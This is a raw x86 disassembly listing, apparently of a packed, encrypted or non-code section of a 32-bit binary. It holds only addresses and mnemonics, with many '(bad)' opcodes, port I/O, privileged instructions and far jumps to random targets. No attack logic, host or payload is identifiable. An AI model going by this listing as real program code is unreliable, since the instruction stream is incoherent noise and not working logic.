  41437b:	sub    esi,DWORD PTR [edx]
  41437d:	movsx  eax,sp
  414380:	cmp    eax,0x65c74bed
  414385:	inc    eax
  414386:	sub    al,0xcf
  414388:	aad    0x90
  41438a:	into   
  41438b:	jmp    0x414336
  41438d:	cmp    eax,0xa27ffd59
  414392:	xor    dl,BYTE PTR [edi]
  414394:	pop    ss
  414395:	rol    BYTE PTR [ecx-0x37],1
  414398:	fldcw  WORD PTR [eax+ecx*1-0x26a3e1f0]
  41439f:	xchg   edi,eax
  4143a0:	pop    ecx
  4143a1:	popf   
  4143a2:	or     DWORD PTR [edi-0x1bd5cabe],ebp
  4143a8:	aam    0x96
  4143aa:	pop    ecx
  4143ab:	ja     0x4143d9
  4143ad:	xor    al,0x7d
  4143af:	data16 fcmovnu st,st(2)
  4143b2:	dec    eax
  4143b3:	jecxz  0x414383
  4143b5:	je     0x41433a
  4143b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143b8:	stc    
  4143b9:	jno    0x414384
  4143bb:	addr16 cmc 
  4143bd:	mov    BYTE PTR [esi+0x1836adfc],dl
  4143c3:	mov    ds:0x93b5f798,al
  4143c8:	clc    
  4143c9:	push   0x15
  4143cb:	mov    dl,0xa4
  4143cd:	out    0x92,al
  4143cf:	pop    eax
  4143d0:	fnstenv [esi+edi*4]
  4143d3:	jne    0x414394
  4143d5:	push   ebp
  4143d6:	or     bl,bh
  4143d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143d9:	xlat   BYTE PTR ds:[ebx]
  4143da:	aad    0x1a
  4143dc:	pop    eax
  4143dd:	fisub  DWORD PTR [edi-0x3ab5ca5a]
  4143e3:	popa   
  4143e4:	in     eax,dx
  4143e5:	neg    cl
  4143e7:	push   0x596365bf
  4143ec:	(bad)  
  4143ed:	pushf  
  4143ee:	mov    BYTE PTR [ebx+0x4fe520e],bh
  4143f4:	jmp    0x4143bd
  4143f6:	bound  edx,QWORD PTR [esi+0x36]
  4143f9:	stos   DWORD PTR es:[edi],eax
  4143fa:	retf   0x899f
  4143fd:	dec    edx
  4143fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143ff:	xor    BYTE PTR [eax-0x6f],0x31
  414403:	mov    esp,0xd5653ff0
  414408:	mov    dl,0xc7
  41440a:	xchg   ebp,eax
  41440b:	mov    esi,0xa4e24fd4
  414410:	lahf   
  414411:	mov    al,ds:0x3ebeff9a
  414416:	mov    WORD PTR [edx+0x2c],gs
  414419:	test   eax,0x5d6d96f
  41441e:	cmp    DWORD PTR [esi+0x3f778e04],ebx
  414424:	popa   
  414425:	into   
  414426:	add    ch,ch
  414428:	mov    ecx,0x752928af
  41442d:	mov    ch,0x1
  41442f:	cli    
  414430:	fist   DWORD PTR [edx-0x1c]
  414433:	popf   
  414434:	fld    DWORD PTR [eax]
	...
  414496:	pop    ebx
  414497:	jae    0x4144db
  414499:	or     eax,0x775f3d6a
  41449e:	ss ins BYTE PTR es:[edi],dx
  4144a0:	pop    esp
  4144a1:	xchg   esp,eax
  4144a2:	rcl    DWORD PTR [esi-0x2cf6121e],cl
  4144a8:	add    BYTE PTR [eax],al
  4144aa:	pop    es
  4144ab:	add    DWORD PTR [eax],eax
  4144ad:	add    BYTE PTR [edi+0x664e07a0],dl
  4144b3:	data16 xor al,0x97
  4144b6:	inc    ebx
  4144b7:	push   DWORD PTR [ebx+0x2f]
  4144ba:	ficomp WORD PTR [edx+0xf]
  4144bd:	fsubr  QWORD PTR [edx+0x4fdb3904]
  4144c3:	pusha  
  4144c4:	sub    eax,0xc9bfc04b
  4144c9:	lds    edx,FWORD PTR [edx+0x31e3b120]
  4144cf:	punpckldq mm1,DWORD PTR [ebx-0x48be945f]
  4144d6:	dec    edx
  4144d7:	or     al,bh
  4144d9:	push   ss
  4144da:	cmp    BYTE PTR [ecx],al
  4144dc:	pop    edx
  4144dd:	pop    edi
  4144de:	in     eax,dx
  4144df:	sub    eax,0x97478925
  4144e4:	neg    BYTE PTR [ecx+0x65c6a531]
  4144ea:	or     eax,0xff6735f2
  4144ef:	sub    DWORD PTR [edx],edx
  4144f1:	pop    esi
  4144f2:	inc    ecx
  4144f3:	push   cs
  4144f4:	xchg   esp,eax
  4144f5:	fwait
  4144f6:	in     eax,dx
  4144f7:	sub    ch,ch
  4144f9:	loop   0x4144e3
  4144fb:	fld    TBYTE PTR ds:0x692fe69d
  414501:	stc    
  414502:	jnp    0x4144e1
  414504:	jle    0x4144a4
  414506:	(bad)  
  414507:	out    dx,eax
  414508:	push   edx
  414509:	sahf   
  41450a:	rcr    BYTE PTR [edi+0x48c83cc8],0xc2
  414511:	add    al,0xd9
  414513:	test   eax,0xb277ed6f
  414518:	xor    dh,BYTE PTR [edi+0x67325a0e]
  41451e:	push   edi
  41451f:	cld    
  414520:	add    edi,ebp
  414522:	push   ebp
  414523:	xor    BYTE PTR [edx],dl
  414525:	pop    eax
  414526:	adc    eax,0xa79f70eb
  41452b:	or     al,BYTE PTR [edx]
  41452d:	popf   
  41452e:	lds    edi,FWORD PTR [ebp+0x1c]
  414531:	jge    0x4145b2
  414533:	pop    ecx
  414534:	call   0x3a2461f
  414539:	in     eax,0x1d
  41453b:	mov    esi,DWORD PTR [ecx]
  41453d:	sti    
  41453e:	or     DWORD PTR [ebx+0x4030759f],edi
  414544:	and    dh,BYTE PTR [eax+ecx*4-0x6e]
  414548:	dec    ebp
  414549:	xchg   al,dh
  41454b:	cmc    
  41454c:	out    0x6f,eax
  41454e:	dec    esi
  41454f:	ins    BYTE PTR es:[edi],dx
  414550:	push   eax
  414551:	pop    ecx
  414552:	sub    dl,ch
  414554:	retf   0x3f6d
  414557:	adc    eax,0x56f9d459
  41455c:	das    
  41455d:	and    bl,BYTE PTR [esp+eax*8-0x173e07de]
  414564:	std    
  414565:	neg    BYTE PTR [edx+ecx*2+0xd4696c1]
  41456c:	lock adc BYTE PTR [ecx+0x6a093a5f],ch
  414573:	call   FWORD PTR [edi-0x2c233704]
  414579:	aad    0xfa
  41457b:	push   eax
  41457c:	mov    ecx,0xde585b6e
  414581:	mov    ds:0xbe2145e6,eax
  414586:	dec    ecx
  414587:	cli    
  414588:	test   esi,0x3e44de74
  41458e:	push   es
  41458f:	pushf  
  414590:	in     al,dx
  414591:	add    DWORD PTR [ebx-0x71],esp
  414594:	out    0x4e,eax
  414596:	cld    
  414597:	pop    ds
  414598:	sbb    ebx,DWORD PTR [eax+0x76]
  41459b:	out    dx,al
  41459c:	popa   
  41459d:	(bad)  
  41459e:	das    
  41459f:	sbb    DWORD PTR [edi+eiz*8-0xd6cbe9d],0x3d
  4145a7:	cmp    eax,DWORD PTR [esi+eiz*1]
  4145aa:	add    ebx,DWORD PTR [eax-0x6e4c4cae]
  4145b0:	fiadd  DWORD PTR [esi+0x24]
  4145b3:	dec    edx
  4145b4:	push   0x0
	...
  414615:	add    BYTE PTR [edi+0x5e],bh
  414618:	cmc    
  414619:	ins    DWORD PTR es:[edi],dx
  41461a:	cmc    
  41461b:	out    dx,eax
  41461c:	call   FWORD PTR [esi+0xd]
  41461f:	mov    al,ds:0xe4710dc2
  414624:	fcomp  DWORD PTR [ecx]
  414626:	adc    ah,dl
  414628:	add    BYTE PTR [eax],al
  41462a:	pop    es
  41462b:	add    DWORD PTR [eax],eax
  41462d:	add    BYTE PTR [ebx-0x76],dh
  414630:	mov    ebp,0x424bd6d8
  414635:	ret    
  414636:	jns    0x414605
  414638:	ins    BYTE PTR es:[edi],dx
  414639:	mov    esp,0x36de4747
  41463e:	mov    ch,0x31
  414640:	stos   BYTE PTR es:[edi],al
  414641:	test   BYTE PTR [ebx-0x70],ah
  414644:	sub    DWORD PTR [edx+0x25],edi
  414647:	fdivr  QWORD PTR [ebx]
  414649:	ja     0x414604
  41464b:	jp     0x4145fb
  41464d:	pop    ebp
  41464e:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  414650:	and    al,BYTE PTR [esi+0xb]
  414653:	pop    ebx
  414654:	adc    ecx,ebx
  414656:	adc    al,0x24
  414658:	add    DWORD PTR [esi-0xc193669],esi
  41465e:	std    
  41465f:	mov    ss:0x25de78f4,eax
  414665:	out    0x76,al
  414667:	push   ebx
  414668:	adc    al,0x33
  41466a:	es jne 0x414618
  41466d:	pop    edx
  41466e:	cdq    
  41466f:	bound  ecx,QWORD PTR [ebx-0x1f407958]
  414675:	dec    esi
  414676:	call   0x533e:0xd3fbc457
  41467d:	mov    cs,esi
  41467f:	test   DWORD PTR [eax+0x2f56fb5f],edx
  414685:	fdiv   st,st(1)
  414687:	fmul   DWORD PTR [ecx]
  414689:	mov    eax,es
  41468b:	jge    0x414630
  41468d:	stos   BYTE PTR es:[edi],al
  41468e:	mov    WORD PTR [ebx+0x56662c78],ss
  414694:	lods   al,BYTE PTR ds:[esi]
  414695:	jbe    0x4146c2
  414697:	mov    DWORD PTR [edi+0x51],eax
  41469a:	mov    es,ebp
  41469c:	int3   
  41469d:	aad    0x26
  41469f:	outs   dx,BYTE PTR ds:[esi]
  4146a0:	pop    ds
  4146a1:	dec    edi
  4146a2:	inc    eax
  4146a3:	dec    edi
  4146a4:	fistp  WORD PTR [edi]
  4146a6:	pop    ebp
  4146a7:	or     DWORD PTR [ebx+0x25],ebx
  4146aa:	bnd jl 0x4146dc
  4146ad:	aam    0xe6
  4146af:	test   BYTE PTR fs:[ebp-0x6d],al
  4146b3:	call   FWORD PTR [ebp+0x26]
  4146b6:	test   eax,0x86eed799
  4146bb:	jmp    0xe4f5f825
  4146c0:	arpl   WORD PTR [ebx],si
  4146c2:	mov    bl,0xfe
  4146c5:	mov    eax,ds:0xd45a5444
  4146ca:	les    eax,FWORD PTR [ebx+ebp*1]
  4146cd:	out    dx,eax
  4146ce:	xlat   BYTE PTR ds:[ebx]
  4146cf:	and    al,0xfd
  4146d1:	lods   eax,DWORD PTR ds:[esi]
  4146d2:	xchg   ebx,eax
  4146d3:	pop    edi
  4146d4:	sbb    dl,BYTE PTR [edx-0x7a]
  4146d7:	cmp    esp,esp
  4146d9:	sub    esi,DWORD PTR ds:0xc44ed4d2
  4146df:	jge    0x4146bc
  4146e1:	push   edi
  4146e2:	mov    eax,0xd8a77fd
  4146e7:	daa    
  4146e8:	jecxz  0x414762
  4146ea:	aaa    
  4146eb:	adc    al,0xfe
  4146ed:	neg    bl
  4146ef:	sub    al,0xec
  4146f1:	rol    BYTE PTR [ebp+0x30],cl
  4146f4:	je     0x4146c7
  4146f6:	nop
  4146f7:	inc    edx
  4146f8:	xchg   edx,eax
  4146f9:	hlt    
  4146fa:	daa    
  4146fb:	mov    ds:0x51d23fdc,al
  414700:	popa   
  414701:	mov    ?,ebx
  414703:	mov    dh,0x4b
  414705:	mov    eax,ds:0xa920de5a
  41470a:	add    ecx,DWORD PTR [ecx-0x26]
  41470d:	add    al,0x23
  41470f:	push   esi
  414710:	inc    ebx
  414711:	push   es
  414712:	or     BYTE PTR [esp+edx*1+0x29860634],cl
  414719:	mov    ds:0xdf46e04d,eax
  41471e:	xchg   ebp,eax
  41471f:	(bad)  
  414720:	setnp  BYTE PTR [ebx-0x4a]
  414724:	adc    eax,DWORD PTR [ecx]
  414726:	pop    ebx
  414727:	rol    BYTE PTR [ebp+0x7b],0xd1
  41472b:	push   edi
  41472c:	out    0x68,al
  41472e:	sahf   
  41472f:	add    al,0x5b
  414731:	stos   BYTE PTR es:[edi],al
  414732:	mov    ds:0x755c,al
	...
  414793:	add    BYTE PTR [eax],al
  414795:	add    BYTE PTR [esi+0x2f],bh
  414798:	add    DWORD PTR [ebp+0x51],ebp
  41479b:	outs   dx,DWORD PTR ds:[esi]
  41479c:	jle    0x4147dd
  41479e:	aam    0x28
  4147a0:	aam    0xa9
  4147a2:	mov    dl,0x69
  4147a4:	shl    BYTE PTR [edi],cl
  4147a6:	pop    ss
  4147a7:	aad    0x0
  4147a9:	add    BYTE PTR [edi],al
  4147ab:	add    DWORD PTR [eax],eax
  4147ad:	add    BYTE PTR [edx+0x46],bl
  4147b0:	jmp    0xb4e78093
  4147b5:	int3   
  4147b6:	loope  0x41476c
  4147b8:	cmp    al,0x42
  4147ba:	xor    BYTE PTR ds:0x16bc151c,dl
  4147c0:	and    al,BYTE PTR [eax-0x79f90ac7]
  4147c6:	mov    edx,ebx
  4147c8:	sbb    dh,al
  4147ca:	and    ecx,DWORD PTR [ebp+0x3a]
  4147cd:	mov    ecx,ebp
  4147cf:	adc    cl,BYTE PTR [ecx-0x5be2170f]
  4147d5:	mov    edx,0xf4ea39a9
  4147da:	popa   
  4147db:	jns    0x4147ea
  4147dd:	(bad)
  4147e0:	mov    ds:0x99d67043,al
  4147e5:	dec    eax
  4147e6:	gs inc esp
  4147e8:	aas    
  4147e9:	inc    edi
  4147ea:	adc    ebp,DWORD PTR [ecx-0x74aa3fc8]
  4147f0:	popa   
  4147f1:	idiv   BYTE PTR [edi-0x80]
  4147f4:	xchg   DWORD PTR [esi],ebp
  4147f6:	xchg   esi,eax
  4147f7:	inc    edi
  4147f8:	outs   dx,DWORD PTR ds:[esi]
  4147f9:	cmc    
  4147fa:	cs jp  0x41480a
  4147fd:	xchg   edi,eax
  4147fe:	mov    WORD PTR [eax-0xb],ss
  414801:	pusha  
  414802:	fdivr  DWORD PTR [edx+ecx*4-0x5e617ee7]
  414809:	cld    
  41480a:	mov    ebp,0x83e2b51b
  41480f:	mov    ah,cl
  414811:	sub    DWORD PTR [eax+0x21],esp
  414814:	outs   dx,BYTE PTR ds:[esi]
  414815:	sbb    eax,0x10426c3e
  41481a:	popa   
  41481b:	popa   
  41481c:	and    BYTE PTR [ebx+0x7c7fe684],0x47
  414823:	shl    DWORD PTR [ecx],cl
  414825:	jbe    0x41486a
  414827:	(bad)  [edx+0x14]
  41482a:	add    al,0xea
  41482c:	cld    
  41482d:	sbb    eax,0x2b20447f
  414832:	dec    edi
  414833:	xchg   BYTE PTR [ecx-0x6f],dl
  414836:	jmp    0x85c2:0x6f6ff013
  41483d:	adc    al,0x61
  41483f:	inc    edi
  414840:	in     al,0xbc
  414842:	mov    ds:0xf7639569,al
  414847:	mov    edi,0xb336be5d
  41484c:	inc    esi
  41484d:	inc    ebx
  41484e:	dec    ebx
  41484f:	out    dx,eax
  414850:	add    DWORD PTR [edx],ecx
  414852:	retf   0x3387
  414855:	mov    ds:0x1d118098,al
  41485a:	push   ds
  41485b:	arpl   WORD PTR [ecx+0x69ffd115],ax
  414861:	adc    ebp,DWORD PTR [eax+0x74ce77f9]
  414867:	sub    ecx,0x67fcb07d
  41486d:	outs   dx,BYTE PTR ds:[esi]
  41486e:	jne    0x414855
  414870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414871:	dec    esp
  414872:	idiv   DWORD PTR [ecx+0x1]
  414875:	push   ss
  414876:	adc    edx,ebx
  414878:	fisub  WORD PTR [edi+esi*4]
  41487b:	or     al,0x14
  41487d:	pop    ss
  41487e:	cld    
  41487f:	mov    al,0xbd
  414881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414882:	mov    ebx,DWORD PTR [eax]
  414884:	jns    0x414849
  414886:	arpl   WORD PTR [ebx+0x7f],bp
  414889:	and    eax,ebx
  41488b:	and    al,0x45
  41488d:	out    dx,eax
  41488e:	retf   
  41488f:	xchg   DWORD PTR [ebx+edx*2-0x2b],edi
  414893:	xchg   esi,eax
  414894:	or     DWORD PTR [edi+0x3],esp
  414897:	fstp   st(1)
  414899:	cs pop edi
  41489b:	adc    eax,0xef9824cd
  4148a0:	pusha  
  4148a1:	pop    ebp
  4148a2:	xor    eax,0x518f6140
  4148a7:	or     ecx,DWORD PTR [ecx+0x25bda4a5]
  4148ad:	cmp    al,0xf1
  4148af:	outs   dx,BYTE PTR ds:[esi]
  4148b0:	dec    ebp
  4148b1:	inc    ebp
  4148b2:	fs inc edi
  4148b4:	dec    edx
	...
  414915:	add    BYTE PTR [ebx],cl
  414917:	jle    0x4148eb
  414919:	and    esi,edi
  41491b:	scas   eax,DWORD PTR es:[edi]
  41491c:	sti    
  41491d:	jle    0x4148ac
  41491f:	sbb    eax,0xf92cc1ed
  414924:	pop    edi
  414925:	add    eax,0xd61e
  41492a:	pop    es
  41492b:	add    DWORD PTR [eax],eax
  41492d:	add    BYTE PTR [ecx],ah
  41492f:	jmp    0xe1cb:0x4cb0e140
  414936:	adc    al,0x78
  414938:	jmp    0x5894:0x2868daf8
  41493f:	repnz mov bh,0xba
  414942:	xchg   ebx,eax
  414943:	jo     0x4149c2
  414945:	push   0x8a67edae
  41494a:	loopne 0x4148e0
  41494c:	shl    ch,cl
  41494e:	add    BYTE PTR [esi+0x21],0x6d
  414952:	mov    ah,0x5c
  414954:	fs ja  0x414934
  414957:	mov    esp,0x45b67d72
  41495c:	push   0xffffff9f
  41495e:	or     BYTE PTR [ebx+edi*8+0x5],dh
  414962:	adc    ah,0x34
  414965:	add    eax,0x8112db9f
  41496a:	data16 ja 0x41491d
  41496d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41496e:	shl    BYTE PTR [edx+0x3f1a2393],0x59
  414975:	jmp    0xbeb92ba6
  41497a:	ror    ecx,cl
  41497c:	mov    edx,0xc51347ab
  414981:	pusha  
  414982:	inc    ebx
  414983:	mov    edx,0xaf4deb4
  414988:	sub    DWORD PTR [ecx+0x5dadda9e],edx
  41498e:	retf   0x5de
  414991:	pop    eax
  414992:	cmp    esi,0xe5a4cf1b
  414998:	(bad)  
  414999:	jns    0x4149fe
  41499b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41499c:	imul   esi,DWORD PTR [ebx+0x3f],0x13
  4149a0:	and    ah,BYTE PTR [edx+0x179354e1]
  4149a6:	fidivr DWORD PTR [esi+0x73]
  4149a9:	das    
  4149aa:	ja     0x41497e
  4149ac:	(bad)  
  4149ad:	aaa    
  4149ae:	loope  0x414945
  4149b0:	or     esp,edi
  4149b2:	retf   0x8f56
  4149b5:	xor    bl,BYTE PTR [ebx]
  4149b7:	fadd   st(2),st
  4149b9:	or     ax,0xddfd
  4149bd:	in     eax,dx
  4149be:	jbe    0x414a18
  4149c0:	sub    al,0x65
  4149c2:	push   eax
  4149c3:	add    al,0x83
  4149c5:	rol    DWORD PTR [edi-0x63],1
  4149c8:	rcr    edx,1
  4149ca:	push   0xffffffce
  4149cc:	jmp    0x66b2:0x98a1e6e7
  4149d3:	repz xlat BYTE PTR ds:[ebx]
  4149d5:	add    al,ah
  4149d7:	lea    edi,[edi+0x7ddcd912]
  4149dd:	jae    0x4149f3
  4149df:	fcom   DWORD PTR ds:0x65de7088
  4149e5:	jp     0x4149dd
  4149e7:	sub    BYTE PTR [esi-0x4e58feeb],cl
  4149ed:	inc    edx
  4149ee:	lock test BYTE PTR [esi-0x62],0x82
  4149f3:	inc    ebp
  4149f4:	mov    es:0xb121afae,al
  4149fa:	sub    BYTE PTR [ebp+ecx*1-0x7ce9a93a],cl
  414a01:	pushf  
  414a02:	sub    ch,0x34
  414a05:	jmp    0x29a517da
  414a0a:	cmp    BYTE PTR [ecx],dl
  414a0c:	sub    bl,BYTE PTR [ecx+ebp*2-0x6cbe3f91]
  414a13:	push   es
  414a14:	fwait
  414a15:	add    eax,0x1b02d630
  414a1a:	adc    al,0xbb
  414a1c:	jmp    0x8a42b351
  414a21:	mov    ebx,0xb2ca87
  414a26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a27:	pop    ebp
  414a28:	stc    
  414a29:	xchg   esp,eax
  414a2a:	jle    0x414a31
  414a2c:	jmp    0x414a1f
  414a2e:	xlat   BYTE PTR ds:[ebx]
  414a2f:	jb     0x414a36
  414a31:	aad    0xeb
  414a33:	in     eax,0xf9
	...
  414a95:	add    BYTE PTR [edi+0x7e363ed9],bl
  414a9b:	neg    DWORD PTR [edi-0x4d9bdb07]
  414aa1:	sbb    ebx,edi
  414aa3:	sbb    al,0x8
  414aa5:	je     0x414acc
  414aa7:	xlat   BYTE PTR ds:[ebx]
  414aa8:	add    BYTE PTR [eax],al
  414aaa:	pop    es
  414aab:	add    DWORD PTR [eax],eax
  414aad:	add    BYTE PTR [ecx],al
  414aaf:	and    edi,DWORD PTR [edx+0x4963472b]
  414ab5:	and    esp,0xcf041df3
  414abb:	mov    ch,0x1a
  414abd:	lods   eax,DWORD PTR ds:[esi]
  414abe:	mov    bl,bh
  414ac0:	inc    ebx
  414ac1:	jae    0x414a62
  414ac3:	sahf   
  414ac4:	jmp    0x64d9:0x5a617149
  414acb:	adc    eax,0x1a46db2f
  414ad0:	xchg   DWORD PTR [edx-0x7b],ecx
  414ad3:	and    al,0xbb
  414ad5:	sar    DWORD PTR [ebx-0x2e926122],0x46
  414adc:	jo     0x414aab
  414ade:	cli    
  414adf:	dec    esi
  414ae0:	mov    cl,0xcf
  414ae2:	rcr    DWORD PTR [ecx-0x7132e818],1
  414ae8:	jnp    0x414b59
  414aea:	mov    ecx,0xaaae3871
  414aef:	pusha  
  414af0:	lods   eax,DWORD PTR ds:[esi]
  414af1:	mov    bh,0xc6
  414af3:	cmp    eax,0x27062fff
  414af8:	imul   esp,ebp,0xffffffb2
  414afb:	std    
  414afc:	inc    ebp
  414afd:	mov    al,0xee
  414aff:	or     DWORD PTR [ebp+0x2d],0x2795cb4f
  414b06:	std    
  414b07:	sub    al,0x28
  414b09:	jmp    0x414b10
  414b0b:	adc    eax,0x273d7cde
  414b10:	test   al,0xcf
  414b12:	push   ss
  414b13:	shl    BYTE PTR [edx+0x1a503722],1
  414b19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b1a:	adc    esi,DWORD PTR [esi+0x44f0a5f3]
  414b20:	pop    ss
  414b21:	retf   0x9d6
  414b24:	pop    ecx
  414b25:	dec    esp
  414b26:	js     0x414b0b
  414b28:	repnz sar DWORD PTR [ecx],1
  414b2b:	mov    edi,0xfd0477aa
  414b30:	cmp    ebx,edx
  414b32:	arpl   WORD PTR [edx],cx
  414b34:	popf   
  414b35:	out    0x39,al
  414b37:	mov    edi,0x9172485b
  414b3c:	enter  0xa8b6,0xa2
  414b40:	mov    esi,0x8d032e9
  414b45:	inc    ebx
  414b46:	push   ebx
  414b47:	add    BYTE PTR [edi+0x44],dh
  414b4a:	fild   DWORD PTR [ebx+edx*8+0x5e]
  414b4e:	std    
  414b4f:	in     al,dx
  414b50:	in     al,dx
  414b51:	imul   eax,DWORD PTR [esi+0x0],0x4346bedf
  414b58:	icebp  
  414b59:	or     BYTE PTR [eax+ecx*4],ah
  414b5c:	mov    ecx,0xba165a81
  414b61:	les    edx,FWORD PTR [ecx+edi*4]
  414b64:	xor    bh,BYTE PTR ds:[edi+0x4eeaffda]
  414b6b:	mov    ds:0x4a58b661,eax
  414b70:	int    0x18
  414b72:	dec    ebp
  414b73:	lock mov edi,eax
  414b76:	rsm    
  414b78:	mov    eax,0x78437363
  414b7d:	push   0xffffffa5
  414b7f:	imul   ebx,DWORD PTR [eax],0xffffffd0
  414b82:	mov    edx,es
  414b84:	sti    
  414b85:	into   
  414b86:	data16 and dl,BYTE PTR [ecx+ebx*4-0x5c]
  414b8b:	or     al,0x7a
  414b8d:	int3   
  414b8e:	sbb    ch,ch
  414b90:	lods   eax,DWORD PTR ds:[esi]
  414b91:	test   ch,dl
  414b93:	leave  
  414b94:	jns    0x414b96
  414b96:	pop    ecx
  414b97:	xchg   ebp,eax
  414b98:	addr16 call 0xac0c:0x395b93c6
  414ba0:	jmp    0xc50f737a
  414ba5:	icebp  
  414ba6:	pushf  
  414ba7:	iret   
  414ba8:	jbe    0x414c04
  414baa:	push   ds
  414bab:	add    ebp,DWORD PTR [ebp-0x4f3f40a]
  414bb1:	cmc    
  414bb2:	and    DWORD PTR [esi+0xd5],ebx
	...
  414c14:	add    BYTE PTR [eax],al
  414c16:	xor    al,0x64
  414c18:	push   ds
  414c19:	jl     0x414c79
  414c1b:	jle    0x414c93
  414c1d:	ins    BYTE PTR es:[edi],dx
  414c1e:	inc    edi
  414c1f:	xor    ah,BYTE PTR [ecx]
  414c21:	push   edx
  414c22:	loopne 0x414c48
  414c24:	xor    BYTE PTR [ecx+0x2c],bl
  414c27:	fadd   DWORD PTR [eax]
  414c29:	add    BYTE PTR [edi],al
  414c2b:	add    DWORD PTR [eax],eax
  414c2d:	add    BYTE PTR [ecx+eiz*8-0x3d],bh
  414c31:	jmp    0x414bb5
  414c33:	mov    bl,BYTE PTR [ebp-0x14]
  414c36:	push   eax
  414c37:	push   edx
  414c38:	rcr    edi,1
  414c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c3b:	mov    bl,0xd2
  414c3d:	add    dh,dh
  414c3f:	mov    edi,0x35ed2fc8
  414c44:	neg    BYTE PTR [ebp+0x77]
  414c47:	not    BYTE PTR [eax]
  414c49:	and    esi,DWORD PTR [ebp+0x5e2ebe21]
  414c4f:	(bad)  
  414c50:	pop    ebx
  414c51:	rol    DWORD PTR [ebp-0x3c],1
  414c54:	sar    BYTE PTR [esi+0x3f],cl
  414c57:	sub    edi,esi
  414c59:	mov    al,ds:0xbcbfc09
  414c5e:	es cmp al,0x94
  414c61:	jmp    0xd00b:0xe3d1f7d
  414c68:	inc    eax
  414c69:	stc    
  414c6a:	sub    ah,al
  414c6c:	adc    al,0x6d
  414c6e:	mov    edx,0xdb6a9e4b
  414c73:	xor    eax,0xd831eeb2
  414c78:	or     eax,0xd85ea9cd
  414c7d:	mov    ch,BYTE PTR [ecx-0x757cf58a]
  414c83:	ror    DWORD PTR [eax-0x4c795f2e],0x8e
  414c8a:	mov    ch,0x94
  414c8c:	rcl    DWORD PTR [edx+0x2e],1
  414c8f:	popa   
  414c90:	cdq    
  414c91:	add    eax,0x5fa2ea9b
  414c96:	ror    DWORD PTR [esi-0x7a],0x3d
  414c9a:	je     0x414d0e
  414c9c:	stc    
  414c9d:	cmp    al,0x64
  414c9f:	retf   0xc0cf
  414ca2:	in     eax,dx
  414ca3:	std    
  414ca4:	xor    BYTE PTR [ebp+0x31],cl
  414ca7:	rcr    DWORD PTR [esi],1
  414ca9:	or     eax,DWORD PTR [ecx]
  414cab:	data16 jno 0x414cfe
  414cae:	sub    eax,0xb3647177
  414cb3:	cmp    BYTE PTR ss:[ebp+0x56b4c41e],bh
  414cba:	push   ebx
  414cbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cbc:	jmp    0x414cb1
  414cbe:	ficomp DWORD PTR [esi+0x6c]
  414cc1:	enter  0x11d0,0xee
  414cc5:	adc    DWORD PTR [esi+0x6f2b8411],ebx
  414ccb:	bound  ecx,QWORD PTR [ebx+0x6d445c81]
  414cd1:	mov    ch,0x31
  414cd3:	scas   al,BYTE PTR es:[edi]
  414cd4:	or     al,0xfd
  414cd6:	mov    WORD PTR [ecx+0x1bfac5d1],ss
  414cdc:	add    DWORD PTR [edi+ebp*8+0x5c],0xffffffc6
  414ce1:	rol    BYTE PTR [edi-0x6a],0x67
  414ce5:	in     al,0x87
  414ce7:	xlat   BYTE PTR ds:[ebx]
  414ce8:	sub    eax,0x1638ab2a
  414ced:	retf   0xae02
  414cf0:	mov    DWORD PTR [ecx-0x41],esi
  414cf3:	out    dx,al
  414cf4:	mov    eax,0x29d27006
  414cf9:	cmp    edx,0xffffff8f
  414cfc:	popa   
  414cfd:	mov    ebx,0xb51ad584
  414d02:	aaa    
  414d03:	and    ebx,DWORD PTR [eax+0xd2624ad]
  414d09:	jbe    0x414d76
  414d0b:	dec    edx
  414d0c:	mov    edx,0x1f94f2c1
  414d11:	sbb    eax,0xe4bc47a5
  414d16:	lock stc 
  414d18:	or     DWORD PTR [ebx+0x76f56227],0x9acae6ff
  414d22:	dec    edx
  414d23:	icebp  
  414d24:	(bad)
  414d27:	popf   
  414d28:	adc    al,0x65
  414d2a:	pop    es
  414d2b:	mov    ds:0xc20deb1f,eax
  414d30:	aam    0xe4
  414d32:	in     eax,dx
  414d33:	gs xchg esp,eax
	...
  414d95:	add    BYTE PTR [edi+0x3e911299],dh
  414d9b:	fwait
  414d9c:	mov    bh,0xbf
  414d9e:	sbb    DWORD PTR [esi+0x16821445],ebp
  414da4:	les    edi,FWORD PTR [ecx]
  414da6:	xor    ebx,ecx
  414da8:	add    BYTE PTR [eax],al
  414daa:	pop    es
  414dab:	add    DWORD PTR [eax],eax
  414dad:	add    ch,al
  414daf:	jle    0x414d68
  414db1:	mov    edx,0x9f378e6
  414db6:	mov    ebp,0xcd50d0eb
  414dbb:	test   eax,0x34bdca0
  414dc0:	sbb    al,0xe3
  414dc2:	pop    es
  414dc3:	outs   dx,BYTE PTR ds:[esi]
  414dc4:	dec    ebp
  414dc5:	jbe    0x414e1c
  414dc7:	xor    BYTE PTR [ecx+0x6258991a],bh
  414dcd:	test   al,0x4c
  414dcf:	mov    ebp,0x8e088412
  414dd4:	mov    WORD PTR [eiz*2-0x543f5594],cs
  414ddb:	cwde   
  414ddc:	retf   
  414ddd:	lock cmp edx,esi
  414de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414de1:	sub    ecx,DWORD PTR [esp+edi*4-0x1095b842]
  414de8:	sbb    bl,BYTE PTR [ebp-0x600ea071]
  414dee:	xor    eax,0xff010d41
  414df3:	add    eax,ecx
  414df5:	(bad)  
  414df6:	(bad)  
  414df7:	lahf   
  414df8:	int3   
  414df9:	popa   
  414dfa:	cmc    
  414dfb:	adc    eax,0x943ceb5d
  414e00:	jecxz  0x414e6a
  414e02:	repnz sub dl,dh
  414e05:	mov    es,WORD PTR [ecx-0x33]
  414e08:	addr16 and al,0xc3
  414e0b:	pop    eax
  414e0c:	lods   eax,DWORD PTR ds:[esi]
  414e0d:	inc    ecx
